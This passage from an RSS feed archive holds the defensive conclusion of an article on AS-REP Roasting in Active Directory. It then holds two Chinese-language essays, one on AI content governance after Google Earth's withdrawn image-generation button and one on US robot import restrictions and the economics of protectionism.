confidence to enable pre-authentication due to fear of breaking unknown applications.\nThe real-world impact of compromised credentials obtained through AS-REP Roasting extends far beyond individual account compromise. Attackers leverage these credentials as initial footholds for sophisticated multi-stage intrusions, using them to conduct lateral movement, escalate privileges, establish persistence through additional credential harvesting or backdoor installation, and ultimately compromise critical business systems and sensitive data. Organizations have reported incidents where AS-REP Roasting success directly enabled ransomware deployment, intellectual property theft, and financial fraud. The financial and reputational consequences of breaches originating from preventable AS-REP Roasting vulnerabilities create strong business justifications for remediation investments. A truly comprehensive defense strategy requires both proactive technical hardening and sustained operational vigilance. Organizations must establish structured remediation programs targeting pre-authentication disabled accounts, treating this as a critical security priority alongside other Kerberos hardening initiatives. Implementation should prioritize immediate pre-authentication enforcement for accounts where business requirements permit, followed by aggressive timelines for migrating or eliminating accounts requiring pre-authentication disabled status. Simultaneously, organizations must implement strong password policies specifically for service accounts and legacy application accounts—these accounts often carry elevated privileges and attract disproportionate attacker focus. The transition from RC4 to AES encryption should begin immediately for systems supporting modern encryption, as this single change makes AS-REP hash cracking computationally prohibitive. Continuous monitoring through SIEM platforms, behavioral analytics, and specialized Active Directory security tools provides real-time detection capabilities and forensic visibility for incident response.\nOnly through this integrated approach combining preventive technical controls, operational vigilance, continuous monitoring, and sustained organizational commitment can enterprises effectively defend against AS-REP Roasting and related Kerberos attacks. The threat landscape continues evolving as attackers develop more sophisticated variations and integrate Kerberos attacks into larger intrusion frameworks, making defense an ongoing security imperative rather than a one-time remediation project. Security leaders should treat Kerberos attack surface reduction as a strategic identity security initiative, not merely a compliance checkbox, given the foundational role Active Directory plays in enterprise security infrastructure.\nCritical CUPS Vulnerability (CVE 9.9) in Linux\nWhat is Silver Ticket Attack: A Comprehensive Guide\nTop 8 Brute Force Tools and Reverse Brute Force Methods\nWhat is Kerberoasting Attack – Kerberoasting: A Comprehensive Guide\nDeep Dive CVE-2026-40138: Pre-Authentication Authentication Bypass in BeyondTrust Remote Access Solutions\nviperone.gitbook.io: AS-REP Roasting\nattack.mitre.org: Steal or Forge Kerberos Tickets: AS-REP Roasting\nvaadata: Active Directory Monitoring: LDAP Log Analysis and ELK Rules\nsplunk: Detecting Active Directory Kerberos Attacks: Threat Research Release\nThe post\nWhat is AS-REP Roasting Exploitation: A Comprehensive Guide\nappeared first on\nDenizHalil - Professional Cybersecurity Consulting and Penetration Testing\n.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "rss",
+      "content_source_url": "https://denizhalil.com/2026/08/03/as-rep-roasting-attack-guide/",
+      "content_chars": 28597,
+      "content_sha256": "304a924bf05c53e5a1862a9f61761fa536d498120e07da66d267365451095aad",
+      "content_fetched_at": "2026-08-03T22:14:28.916751+00:00",
+      "author": "denizhalil-blogs",
+      "author_name": "DenizHalil Blogs",
+      "author_url": "https://denizhalil.com/blogs/",
+      "published_at": "2026-08-03T05:35:00+00:00",
+      "collected_at": "2026-08-03T22:12:48.983315+00:00",
+      "tags": [
+        "kind:publish",
+        "src:denizhalil-blogs",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://denizhalil.com/blogs/",
+        "https://denizhalil.com/2026/08/03/as-rep-roasting-attack-guide/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "denizhalil-blogs",
+          "url": "https://denizhalil.com/blogs/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "denizhalil-blogs",
+          "name": "DenizHalil Blogs",
+          "home_url": "https://denizhalil.com/blogs/"
+        },
+        "article": {
+          "title": "What is AS-REP Roasting Exploitation: A Comprehensive Guide",
+          "url": "https://denizhalil.com/2026/08/03/as-rep-roasting-attack-guide/",
+          "content_sha256": "304a924bf05c53e5a1862a9f61761fa536d498120e07da66d267365451095aad"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "rss"
+      }
+    },
+    {
+      "id": "a:3b6150c7f9e06ab2",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "界面承诺决定平台态度：从 Google Earth 事件看 AI 内容治理",
+      "target_url": "https://yage.ai/share/factual-interface-credit-platform-attitudes-20260803.html",
+      "text": "yage-share published: 界面承诺决定平台态度：从 Google Earth 事件看 AI 内容治理",
+      "at": "2026-08-03T00:00:00+00:00",
+      "external_id": "a:3b6150c7f9e06ab2",
+      "url": "https://yage.ai/share/factual-interface-credit-platform-attitudes-20260803.html",
+      "title": "界面承诺决定平台态度：从 Google Earth 事件看 AI 内容治理",
+      "content": "AI 内容治理\n平台政策\n记录界面里出现了一个生成按钮\n2026 年 7 月 30 日，Google 在网页版\nGoogle Earth\n里放进了一个新的生成按钮，背后用的是自家的图像生成模型\nNano Banana 2\n。Google 当时的想法其实挺直白：他们想把 Google\nEarth\n从一个单纯查卫星图的数据库，变成一个能帮你做假设推演的互动工具。比如做城市规划、模拟气候灾害，或者地理教学，你只要把地图拉到任何一个地方（这是真实的卫星画面输入），再敲进一句提示词（比如模拟暴雨淹没后的街区），就能在真实的卫星底图上直接合成出一张逼真的假想图（这是输出）。\n不过这个功能上线才刚刚一天，Google 就紧急把它撤了下来。Google 在\n官方声明\n里直接说明了原因：「我们深知大家对\nGoogle Earth\n抱有独特的信任，把它当作观察真实世界的可靠窗口……但我们也看到，有人在社交平台上分享了一些生成的截图，看起来违反了我们的政策。在准备好更严格的防御措施之前，我们决定先撤回这个功能……这些生成的图片此前并没有直接呈现在其他人的主界面里，而且图片上也带上了\nAI 生成的水印。」\n读到这里，你可能会产生一个很自然的疑问：既然 Google\n在声明里强调图片上有 AI\n水印，而且这些生成结果并没有直接替换掉其他人屏幕上的真实地图，那大家为什么还会把它们当成现实中发生的事情？\n关键就在于图片离开界面后的传播场景。用户在 Google Earth\n网页里生成假想图后，随手就会截个图，发到 X（Twitter）、Reddit\n或者微信群里。一旦图像脱离了 Google Earth\n原生界面的约束，那些边角上的轻量 AI\n标注或隐形水印在社交平台上就基本失效了：普通网友刷社交媒体时，压根不会拿专门的技术工具去扫水印，大家眼里看到的，就是一张带着\nGoogle Earth 标志性视角和真实地形的卫星截图。\n上线当晚，开源情报分析师 Henk van Ess\n跑去试了一下，发现安全拦截很容易被绕过去。他一口气生成了洛杉矶不存在的弹坑、被水淹没的国会大厦、着火的\nGoogleplex、倒塌的埃菲尔铁塔、伊朗核电站，还有加沙医院被炸毁的画面（据\nArs\nTechnica\n报道\n）。当这些截图被传到社交平台后，受众顺着过去的习惯，第一反应依然是这是从\nGoogle Earth 上截下来的真实卫星图。van Ess 在接受\nBBC\n采访\n时讲的那句话，正好点破了这个玄机：「伪造图本身不需要看起来天衣无缝，它直接继承了诞生它的那张地图的信誉。」\n这句话道出了界面设计里一个很容易被忽略的细节。过去二十年来，记者、情报分析人员和救援团队都习惯拿\nGoogle Earth\n当作核对现实的底牌。大家在这个界面里看图时，压根不会去怀疑图片的真假，就像你在\nGoogle\n导航上看到一条路，不会怀疑那条路根本不存在一样。当生成按钮直接嵌进这个界面时，地图给人的感觉还是客观记录，但输出的内容却已经变成了算法模拟。大家顺着过去的习惯去看图，就把合成画面当成了现实证据，期待和界面的实际属性就这么错开了。\nTechPolicy.Press\n的评论\n对这件事的总结也很传神：「Google Earth\n不再只是对现实的记录，它变成了一个能够制造逼真现实的生成器，把大家最信任的现实基础设施与生成式\nAI 之间的边界给抹平了。」\n信用比来源证明传播得更远：事实界面的信用随导出物传播，provenance\n信号在离开界面后衰减\n信用比来源证明传播得更远\nGoogle Earth\n事件暴露了一个很现实的问题：当生成图通过截图流向社交网络，光凭这是从权威界面截出来的这一视觉印象，就足够让不少人把假图当成真新闻了。那么，后续靠技术手段去查验这些图片的真伪，到底可不可行？\n图片一旦离开了原生界面被到处转发，查清来源往往就很费劲了。2026 年 3\n月 8 日，伊朗媒体\nTehran Times\n在 X\n上发了一组前后对比的卫星图，声称巴林的美军基地雷达被炸毁了。新闻核查团队\nBBC Verify\n随后拿这张图做了调查。如果只靠肉眼看，图片其实有很低级的漏洞，比如基地外面停着的几辆小车，在号称隔了一整年的两张卫星图里，停的位置居然分毫不差。\n不过肉眼看到的破绽只是疑点，真正拿出过硬技术物证的，是 BBC Verify\n调用的\nGoogle SynthID watermark detector\n（SynthID\n检测器）。SynthID 是 Google 搞的一种像素级隐形水印，只要是用 Gemini 或者\nGoogle 的 AI\n工具做出来的图，像素底层都会静默打上这种标记，一般的剪裁、打码或微调都不容易把它洗掉。检测器直接从像素底层证实了这张所谓的战时卫星图，确实是用\nGoogle 的 AI 工具伪造或者修改出来的（详见\nBBC Verify\n报道\n）。\n这是第一个被 SynthID\n在技术层面实锤的战时虚假信息案例，说明靠水印追溯在技术上确实行得通。但问题在于，这种追溯非常依赖有人主动拿着工具去查，而且前提是图片在各个平台转发的过程中，水印信号还没被折腾掉。\n现实中的传播链条可没这么理想。比如行业里推行的\nC2PA\n标准，这是由 Adobe、微软等公司联合发起的开源内容凭证协议（Content\nCredentials）。它的做法是在图片或视频文件里插入加密数字签名，记录下这张图是用什么\nAI\n工具做的、经过了哪些修改。但这种方案有个致命弱点：签名是藏在文件的元数据里的。只要用户一截图，或者把原图传到\nFacebook、Instagram、X 或 WhatsApp\n上，社交平台为了省带宽做压缩转码，就会顺手把文件里的元数据全抹掉。这倒不是平台故意要帮伪造者遮掩，纯粹是网络分发转码时的附带伤害（详见\nSoftwareSeni\n技术分析\n）。直接埋在像素里的\nSynthID\n确实不怕普通截屏，但它既看不见，又绑定了 Google 自己的私有算法，Google\n的检测器认不出 OpenAI 的水印，反过来也一样（据\nArs\nTechnica 实测\n）。甚至网上早就有了免费的抹除工具（比如\nremovesynthid.io\n）和各种\n破解教程\n。开发者\nSean Goedecke 就直言，如果大家不都把签名用起来，C2PA\n就更容易变成表面功夫。比如 FotoForensics\n网站每周收到几万张图，里面带有效签名的往往只有十几张（见\nSean\nGoedecke 的分析\n）。\n这就造成了一种很无奈的落差，就像大家常说的“造谣一张嘴，辟谣跑断腿”：大平台和权威界面带给人的信任感可以跟着截图到处传，但证明这张图是\nAI 做的标记，却在转发过程中一路流失。\nGoogle Earth\n用二十年攒下的权威信用，被一张导出的截图轻易带走了，而要证明它是假的，却得靠专业的检测工具和繁琐的核验流程才能看出来。\nBBC Verify 的测试也证实了这一点：\nSynthID\n在 Google\n自家的 Gemini 和 Lens\n里识别率确实不错，但依然有办法绕过去；如果遇到稍微调过色或处理过的图片，第三方的检测工具经常直接失灵（详见\nBBC\n测试结果\n）。这种困境光靠把水印算法做得更厉害是很难解决的，因为信任在人际网络里的传播速度，本来就比技术验证流失的速度快得多。\n三种态度由界面承诺与商业激励共同决定：禁止、标注/降权、拥抱\n界面承诺是首要因子\n既然水印和技术标记在跨平台传播时必然会流失，平台显然就不能把希望全都寄托在事后验证上。在\n2024 到 2026 年这几年间，全球主要的互联网平台在面对 AI\n生成内容时，逐步演化出了三种截然不同的治理态度：直接封杀、打上标签，以及全面拥抱。有趣的是，平台选哪条路，可不是随机拍脑门定的。\n把\nWikipedia\n和\nSnapchat\n放在一起对比，这种差别就特别明显。2026 年 3 月 20\n日，\nWikipedia\n的编辑社区以 44 对 2\n的压倒性票数，决定严禁用大语言模型来生成或改写百科条目，只留了翻译和微调错别字这两个小开口（详见\nQuartz\n报道\n与\nAI\nAutomation 政策解读\n）。社区最担心的就是 AI\n弄乱了每句话都要有明确作者和可靠来源的铁律，还可能让互联网充斥 AI\n自己抄自己的垃圾。但同一时间的\nSnapchat\n完全是另一个画风，他们在 2025 年底把 Imagine Lens 滤镜免费放给了 3.5\n亿日活用户，AI 滤镜播放量刷到了 380 亿次，2026 年更是顺势推出了全套 AI\n广告生成工具（见\nSnapchat\n官方公告\n）。\n两个平台之所以选了截然相反的方向，根子在于它们平时给用户做出的承诺不一样。维基百科给人的承诺是可核查的严肃事实档案，每句话都要有人负责；而\nSnapchat 给人的预期就是朋友间找乐子的 AR 滤镜。在维基百科里塞进 AI\n生成，等于直接砸了自己的招牌；但在 Snapchat\n里，搞怪和好玩本来就是产品的一部分，大家看到恶搞滤镜根本不会当真。\nGoogle Earth\n之前那次踩坑，也是撞在了这根线上。作为大家查地理和地图的基准工具，它背负着极高的事实记录属性。直接在地图主界面里安一个生成按钮，等于在承诺没变的情况下，悄悄把给用户看的东西从事实变成了算法模拟。如果当时把它做成一个独立的虚拟沙盒模式，加上醒目的状态提示和原图对比，大家的反应绝不会这么大。\n连同一家大厂内部，不同产品的策略也是大相径庭的：Google 在\nGoogle Earth\n上发现不对立刻撤回，但在 Gemini\n对话界面里大力推广生成；Meta 在 Facebook\n社区里严查政治敏感生成图，但在自己的设计软件 Meta Imagine\n里却鼓励大家随便画；\nLinkedIn\n之前还兴冲冲地推出了 AI\n帮你写文章的功能，到了 2026 年 7 月 31\n日又赶紧把这个功能关了，反而上线了一个怀疑是 AI\n垃圾内容的举报按钮。决定平台政策的不是大厂口头上的价值观，而是具体产品和用户之间那份看不见的信任约定。\n三种态度的深层困境与治理外包\n如果我们顺着界面承诺的视角深入看下去，就会发现封杀、打标、拥抱这三条路径背后，各自对应着非常具体的现实困境与治理逻辑。\n对于那些一旦出错后果极严重的领域，大家最普遍的防线就是直接一刀切。\nBBC\n在内部测试里发现 AI 助手做新闻有 45%\n的概率会捏造或弄错事实，于是干脆严禁在新闻采编出版里直接用生成工具（见\nMedia Copilot\n分析\n）。像\nElsevier\n、\nSpringer Nature\n、\nWiley\n、\nScience\n和\nCell\n这些顶级学术期刊，也全都拒绝把 AI\n当成论文作者，而且绝大多数都不允许提交 AI 做出来的实验图片（见\n学术出版政策汇总\n）。音乐平台\nBandcamp\n和\nQobuz\n也一样，坚决不收纯 AI\n生成的歌曲。这些地方的共同点就是：一旦假内容混进去了，事后澄清和收回的成本太高了。\n至于靠打上 AI\n生成标签让大家自己去辨别，实际效果其实挺尴尬的。多伦多都市大学 The Dais\n找了 2472\n个人做实验，发现平时大家见到的那些小标签，对大家信不信或者转不转发几乎没影响，只有那种挡住整张屏幕的强弹窗警告才管用（见\nThe Dais\n实验分析\n）。MIT 做了 7500 多人的实验也发现，光贴一个中性的 AI\n生成标签，远不如直接标上虚假内容来得管用，有时候漏标了反而会让没贴标的内容看起来更像真的（见\nMIT\n实验报告\n）。平台自己心里也有数，知道光打标只是应付合规，所以大家现在基本都是打标加控钱与算法组合拳：\nTidal\n给 AI 歌曲贴标签的同时，直接把它们的版税收益给清零了（据\nVariety\n报道\n）；\nTikTok\n水印、元数据和用户自报三管齐下，标了 30\n多亿条视频（见\nTikTok\n治理数据\n）；\nLinkedIn\n则是一边放开举报入口，一边用算法自动降权，一天就能拦截几十万次机器人灌水（据\nFortune\n报道\n）。\n那些选择全面拥抱 AI\n的平台，说白了是把鉴别的责任交给了用户或者市场自己。像\nAdobe Firefly\n推出创意助手（见\nAdobe\n发布说明\n），\nCanva\n靠 Magic Studio 卖到了 40\n亿美元年收入，\nNotion\n把 AI\n当成主打卖点，因为大家用这些工具本来就是为了干活和搞创意，没人觉得里面的输出是严肃的现实依据。\nEpic Games Store\n坚持不强制要求标注 AI 游戏资产，CEO Tim Sweeney 还吐槽 Steam\n强迫开发商披露做法太苛刻（据\nVGC\n报道\n）。但 Steam 的公开数据显示，带有 AI 标签的游戏平均评论数少了\n53%，说明玩家心里其实非常介意，不打标只是把风险留给了买游戏的玩家。\n大家之所以这么头疼，根本原因在于 AI\n生产太快，而人工审查根本跟不上。Starling Lab 算过一笔账：人类用了 149\n年才拍出了 15 亿张照片，而生成式 AI 只要 18 个月就画出了同样多的图（见\nStarling\nLab 数据分析\n）。\nLinkedIn\n每天拦截的自动化灌水，比\nFacebook 过去一个月封的账号还要多（据\nMediaPost\n报道\n）。虽然有半数 Z 世代用户说看到 AI\n垃圾内容就想取关，但社交平台上依然有成千上万的推文在靠自动化农场维持热度（见\nValue\nAdd VC 报告\n）。过去 Web2\n靠封几个账号就能搞定审核的旧办法，在脱离真实身份的批量生产面前已经不管用了。\n况且政策也在一步步逼近。2026 年 8 月 2 日，\nEU\nAI Act 第 50 条\n和\n加州 SB 942 细则\n同一天生效了。欧洲要求合成内容必须带上机读标记，不然最高罚 1500\n万欧元或者全球营收的\n3%；加州则规定月活过百万的平台得免费给用户提供验证工具和隐性水印。Google\nEarth 当时紧急关掉功能，刚好就在这个法规生效日的前两天。\n结语：从「是否 AI」到界面契约\n如果我们回头看看自己的产品，想评估怎么做 AI\n治理，有三个衡量指标特别管用：产品的界面是不是偏向客观严肃记录、一旦大家看错图造成的代价有多大，以及生成的标记在传播里会不会轻易掉光。如果当时拿这套思路去给\nGoogle Earth\n做设计，最稳妥的办法显然不是在主参考界面里直接塞个按钮，而是把它单独拉出来做一个虚拟沙盒模式，加上醒目的状态标识，再提供和真实卫星图的同屏对比。只要界面的原本承诺没有被打破，大家自然就不会产生错误的期待。\n当然，也有不少同行觉得平台这些操作全都是商业利益算计，界面承诺无非是事后找的漂亮借口。比如\nSnapchat 开放功能是为了拉长停留时间，Tidal\n切断版税是为了保住音乐人的钱袋子，LinkedIn\n清理垃圾内容是为了防止自己的职业网络变得不值钱。商业利益确实能解释平台为什么在这个时间点出手，但它单凭自己很难解释为什么同一家巨头旗下的不同产品，会采取完全相反的态度。这两个视角其实不矛盾，刚好互为补充。\n说到底，光死磕这张图或者这段话是不是 AI\n做的，往往很难找到满意的答案。真正决定产品安全和治理路线的，是生成技术到底改变了内容的什么属性、界面给用户传递了什么样的信任，以及大家在发现真相之前会凭这些内容去干什么。当做产品的人不再指望某一个万能的水印或标签，而是重新审视自己界面和用户之间的那份信任契约时，AI\n内容治理的难题才算找到了真正落地的解法。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/factual-interface-credit-platform-attitudes-20260803.html",
+      "content_chars": 6440,
+      "content_sha256": "e1899349c2091b6a0d1ca3cfdb415b7bff78bc90b81389961dbcc80ba4290052",
+      "content_fetched_at": "2026-08-03T22:14:08.047484+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-08-03T00:00:00+00:00",
+      "collected_at": "2026-08-03T22:12:48.983315+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/factual-interface-credit-platform-attitudes-20260803.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "界面承诺决定平台态度：从 Google Earth 事件看 AI 内容治理",
+          "url": "https://yage.ai/share/factual-interface-credit-platform-attitudes-20260803.html",
+          "content_sha256": "e1899349c2091b6a0d1ca3cfdb415b7bff78bc90b81389961dbcc80ba4290052"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:7781a639e9c3c9a4",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "机器人、芯片与稀土的保护主义成功条件",
+      "target_url": "https://yage.ai/share/us-robot-ban-protectionism-20260802.html",
+      "text": "yage-share published: 机器人、芯片与稀土的保护主义成功条件",
+      "at": "2026-08-02T00:00:00+00:00",
+      "external_id": "a:7781a639e9c3c9a4",
+      "url": "https://yage.ai/share/us-robot-ban-protectionism-20260802.html",
+      "title": "机器人、芯片与稀土的保护主义成功条件",
+      "content": "产业与竞争\n宏观与地缘\n安全与供应链\n2026年7月底，美国联邦通信委员会更新了\nCovered\nList\n，同步发布了\nDA-26-786\n通告\n和\nFCC Fact\nSheet\n，把外国生产的先进机器人设备正式列了进去。按照配套的\nRobotics\nNational Security Determination\n认定和\n47 CFR\n§2.903\n的规定，只要是符合条件的新型号，后续就很难拿到无线设备授权，没法在美国进口或销售了。消息一出，圈子里讨论得很热闹，很多人第一反应是觉得美国终于要对外国人形机器人下重手了。但如果仔细翻一下具体的文件条款，会发现受限的范围远不只是几万美元的昂贵人形机器，而是直接划了一条很宽的技术线：重量超过4.4磅、装有传感器、跑着自主导航软件，而且网络连接速度超过200kbps的地面移动设备全都在里面。正如\nCovington\n独立法律分析\n提醒的那样，这意味着从工厂里的自主搬运车，到家庭用的割草机器人和泳池清洗机，只要是外国生产的新型号，都会碰上这道许可门槛。\n面对这项新规，坊间迅速形成了两种截然相反却同样片面的叙事。一种声音认为，中国当年搞白名单和产业补贴非常成功，培育出了一批全球巨头，美国现在不过是学中国而已，以子之矛攻子之盾，理所当然；另一种声音则认为，美国现在搞设备禁令完全是闭关锁国，如同晚清自封，是产业衰落和竞争退步的前兆。这两种看法的共同问题在于，把复杂的产业经济学硬套进了非黑即白的二元情绪框架里。无论是全盘神化保护主义，还是简单将其扣上闭关锁国的帽子，都无法解释真实商业世界中的纷繁现象。\n要评估一项保护政策到底能换来战略安全，还是会变成搬起石头砸自己的脚，不能靠情绪化的标签，而是要具体问题具体分析。首要的切入点，是看被限制的产品究竟处于产业链的什么位置——它到底属于终端消费品，还是生产工具？如果是服装、鞋帽或者普通家电被加了关税，买单的主要是终端消费者，大家要么多花点钱，要么换个牌子，这种成本主要停留在消费环节，对整体生产力的传导相对局部。但机械臂、算力芯片、高精度传感器和移动机器人完全不一样，它们不是买回家享乐的消费品，而是工厂、实验室、物流仓和农场用来干活、降成本、搞研发的生产工具。给消费品设限影响的是生活成本，给生产工具设限传递的则是生产力成本。\n一旦给生产工具设限，成本就不会停在买卖的那一刹那，而是会顺着整个生产和研发链条一路传导放大。如果某种生产工具在本土一时半会儿找不到性价比相当的替代品，一刀切的限制就会迫使本土企业去买更贵、性能差一截或者交期拖很久的备选项。对准备做自动化改造的工厂来说，这意味着装配线的投入成本陡增；对做具身智能研究的实验室来说，这意味着同样的预算下能买到、能用来做实验的机器人少了一大半。当干活的工具变贵、变少，本土企业的生产力改进就会慢下来，这种成本抬升最终会削弱本土下游产品在国际上的竞争力，原本想保护本土产业，结果反而损害了本土的生产效率。\n三种技术限制的成本传导拓扑\n三种不同的技术拓扑\n如果我们带着这个视角，去重新审视这几年全球范围内几个经典的限制案例，会发现相当有意思的对应关系。中国在稀土冶炼与加工上掌握着产能控制，美国试图通过加征关税强推稀土供应链回流；美国在芯片设计与制造设备上实施出口控制，中国则加快本土算力替代；中国当年通过补贴和目录限制外国电池共享优惠，美国现在则限制外国机器人进入本土市场。如果把这些案例放在同一个坐标系里观察，它们表面上都是政策干预，但背后的底层结构真的一样吗？答案显然是否定的，因为它们的成本和技术结构其实代表了三种完全不同的形态。\n芯片能防住，是因为源头卡在极少数公司手里\n芯片领域的技术壁垒，高度集中在 EDA 软件、核心 GPU\n架构设计以及少数几家制造设备厂商手里。整个产业链呈现出资本和技术极度密集的特征，源头控制点在物理和企业维度上都非常集中。在这种情况下，掌握源头瓶颈的一方如果实施管制，确实能在短时间内给对手带来直接的算力阻断。因为芯片设计和制造的门槛实在太高，建一条替代供应链需要好多年和巨大的资金投入，所以在这个领域，防守型限制容易在特定时间窗口内看到明确的阻断效果。\n美国对稀土加关税，往往是本国制造业在买单\n稀土和关键矿产的情况刚好相反。美国曾试图通过 301\n条款对中国生产的稀土永磁体加征高达25%的关税，本意是逼迫本土企业减少对中国稀土零部件的依赖，拉动供应链去风险。然而，稀土真正的瓶颈从来不是地下的矿石，而是选矿之后的冶炼分离、高纯度提炼和高级磁体材料的加工工艺。这是一个高度依赖环保成本、长期工艺经验积累和化工调试的产业链。由于美国本土缺乏成熟且有成本优势的冶炼工厂与磁体制造能力，光靠加征关税，不可能在短时间内凭空拔起几座化工和冶炼设施。\n这种情况下强行加征关税，关税和断供的成本只能由美国本国的下游制造业来硬扛。无论是电动汽车厂购买电机组件，还是国防工业采购隐身战机所需的关键构件，都不得不支付更高的原材料关税溢价。关税政策非但没能在短时间内建立起本土的稀土自主体系，反而成了美国本国高端制造业的额外经济负担。\n机器人最怕禁硬件，因为这会断掉算法的数据流\n机器人和具身智能则代表了第三种更为特殊的结构。它的技术演化同时依赖两件事：一是物理硬件的制造集群，二是真实场景里的部署数据。硬件层面，伺服电机、减速器、滚珠丝杠和传感器，高度依赖庞大的制造集群和规模化量产来把成本压下来；软件层面，具身智能模型的训练，高度依赖设备在真实环境里的海量交互数据。无论是导航避障还是机械臂抓取，都需要设备在成千上万个真实场景里跑上万个小时。这种双重依赖形成了一个明确的逻辑：有规模才有低成本硬件，硬件便宜了才能大规模部署，大规模部署才能拿到海量数据，而数据又能反过来让算法模型越跑越聪明。\n如果外国厂商在北美之外的市场依然占着很大份额，它们就能继续靠全球市场摊薄硬件成本，靠海量的真实场景数据迭代算法。这时候如果硬生生封锁本国市场，而本土又拿不出性价比相当的替代硬件，结果就是本土企业买工具的成本被推高，能在真实场景里跑起来的设备大幅减少。数据闭环一旦变窄，本土模型迭代的速度就可能落后于全球主流水平，最后不仅没有缩小差距，反而在累计产量和算法演化上被拉得更远。\n正向扶持 vs\n负向封锁：工具方向反转\n正向扶持与负向封锁完全是两码事\n看清这三种拓扑之后，我们就能进一步理解为什么不能简单照搬历史上的产业政策经验。大家讨论产业政策时，经常拿中国当年电池白名单的经验来举例，觉得当年靠阶段性保护培育出了一批全球电池巨头，今天设限也能起到类似的效果。但如果仔细看当时具体是怎么跑通的，就会发现它和今天的防守型禁令走的是两条完全相反的路径。\n当年电池白名单政策能起作用，靠的是三个关键的前提：第一，本土本身就有巨大的消费和商业应用市场，能消化掉早期成本偏高、性能还没那么完美的产品；第二，本土拥有成本极低、效率极高的制造供应链，能快速把规模效应做出来；第三，整个过程中始终保持对全球技术、资本和零部件供应链的开放吸收，本土企业是在融入全球分工的过程中把技术磨出来的。现在的防守型限制主要靠出口管制、\nCovered List\n审查和关税，它的动作是把外国供给排斥在外，而不是直接提升本国工厂的生产效率。如果一个国家在某种硬件上本身就面临制造成本高、零部件供应链不全的客观条件，单靠把外国高性价比产品挡在门外，并不会自动变出有竞争力的本土替代品。按\n47\nCFR §2.939\n的规定，后续即使开启单独撤销程序，封锁争取的所谓学习时间，也大概率会变成下游企业不得不承担的高额成本，甚至让本土技术路线脱离全球主流生态。\n零信任软件审计才是更理性的路\n把这几种硬科技的成本和技术结构捋清楚之后，思路就会变得清晰：在机器人和具身智能领域，光靠按生产地一刀切禁硬件，并不是兼顾安全和产业竞争力的好办法。在国防、关键基础设施和敏感部门，对进场设备搞严格的原产地审查完全合理；但如果把这种按地理生产地划线的做法扩大到常规工业、仓储物流甚至家用领域，带来的经济副作用会远大于安全收益。智能化硬件带来的网络安全、数据隐私和远程控制担忧是真实的，但解开这个结的办法，应当是实现硬件躯干和数据通路的解耦，也就是从工业时代的排斥硬件，转向数字时代的零信任软件与数据审计。\n一台设备到底安不安全，关键看它跑的固件透不透明、数据发往哪里、模型权重有没有留后门，而不是只看它的车轮或机械臂是在哪个工厂组装的。如果一家外国设备厂商愿意接受完整的软件物料清单审查，把数据存储和边缘计算节点放在本土监管框架下，并提供随时可被审查的固件更新机制，就没有必要仅仅因为制造地点而把它拒之门外。建立这种透明、可验证、可撤销的软件与数据安全认证体系，既能把潜在的安全风险防住，又能让本土的工厂、物流和科研机构继续享受全球低成本硬件带来的效率红利。评估任何科技保护政策，核心是看清楚不同产品的物理与经济属性。只有当本土拥有足够的制造供给弹性、技术还在快速学习期，而且政策留有明确成本控制和退场机制时，保护才可能变成优势。反之，如果在生产工具领域盲目扩大封锁，保护主义的刀刃最后往往会切伤自己产业走向智能化的脚步。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/us-robot-ban-protectionism-20260802.html",
+      "content_chars": 3771,
+      "content_sha256": "136505444f8f5ac562bcd593401646d8e7c724f6a4320034145f1d5ae9078bca",
+      "content_fetched_at": "2026-08-03T22:14:08.447730+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-08-02T00:00:00+00:00",
+      "collected_at": "2026-08-03T22:12:48.983315+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/us-robot-ban-protectionism-20260802.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "机器人、芯片与稀土的保护主义成功条件",
+          "url": "https://yage.ai/share/us-robot-ban-protectionism-20260802.html",
+          "content_sha256": "136505444f8f5ac562bcd593401646d8e7c724f6a4320034145f1d5ae9078bca"
+        }
